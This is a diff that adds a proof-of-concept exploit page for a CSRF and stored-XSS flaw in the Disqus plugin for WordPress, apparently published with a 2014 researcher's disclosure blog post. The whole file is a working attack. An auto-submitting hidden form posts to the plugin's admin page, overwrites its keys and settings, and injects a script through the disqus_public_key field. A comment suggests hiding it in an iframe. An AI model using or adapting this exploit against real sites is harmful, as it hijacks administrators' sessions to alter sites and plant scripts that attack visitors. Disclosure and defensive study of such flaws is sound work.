@@ -1,0 +1,30 @@
+<!--
+Exploit for Disqus for Wordpress admin stored CSRF+XSS up to v2.7.5
+
+Blog post explainer: https://www.nikcub.com/posts/multiple-vulnerabilities-in-disqus-wordpress-plugin/
+
+12th August 2014
+
+Nik Cubrilovic - www.nikcub.com
+
+Most of these params are unfiltered/injectable. Not framable on newer Wordpress.
+
+-->
+
+<body onload="javascript:document.forms[0].submit()">
+  
+
+<form  action="http://wordpress.dev/wp-admin/edit-comments.php?page=disqus" method="post" class="dashboard-widget-control-form">
+<h1>disqus csrf reset</h1>
+<!-- Idea for you: Iframe it -->
+<input name="disqus_forum_url" type="hidden" value="wordpress342222222" />
+<input name="disqus_replace" type="hidden" value="all" />
+
+<!-- <input name="disqus_partner_key" type="hidden" value="1" /> -->
+<input name="disqus_cc_fix" type="hidden" value="1" />
+<input name="disqus_partner_key" type="hidden" value="1" />
+<input name="disqus_secret_key" type="hidden" value="1" />
+<!-- Your File: <input name="disqus_sso_button" type="file" /><br /> -->
+<input type="submit" value="save" />
+<input name="disqus_public_key" type="hidden" value='&lt;/textarea&gt;<script>alert(1);</script><textarea>' />
+</form>
